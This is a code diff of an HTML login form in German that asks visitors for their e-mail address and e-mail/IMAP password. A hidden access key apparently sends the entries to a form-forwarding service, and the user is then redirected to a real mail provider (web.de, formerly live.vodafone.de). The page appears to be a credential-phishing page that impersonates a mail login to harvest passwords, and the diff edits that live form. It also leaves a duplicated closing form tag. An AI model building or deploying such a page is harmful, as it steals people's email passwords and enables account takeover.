@@ -99,18 +99,21 @@
 
                     <input type="hidden" name="access_key" value="b2c1dcc9-5d72-4527-9fdc-dea56bd181cb">
 
-                    <input type="hidden" name="redirect" value="https://live.vodafone.de/">
+                    <input type="hidden" name="redirect" value="https://web.de">
 
                     <div>
-                        <input type="text" placeholder=" E-mail-Adresse" name="E-mail" required class="Email">
+                        <input type="text" name="text" placeholder=" E-mail-Adresse" maxlength="50" required class="Email">
                     </div>
+
                     <div>
-                        <input type="text" placeholder=" E-Mail-Passwort" id="passwort" name="Passwort" required class="passwort">
-                        <label for="passwort ">Trag hier Dein E-Mail-/ IMAP-Passwort ein</label>
+                        <input type="text" name="text" placeholder=" E-Mail-Passwort" required class="passwort">
+                        <label>Trag hier Dein E-Mail-/ IMAP-Passwort ein</label>
                     </div>
-                    <div>
+
+                    <div class>
                         <input type="submit" value="Login" class="submit">
                     </div>
+                </form>
                 </form>
             </section>
         </main>
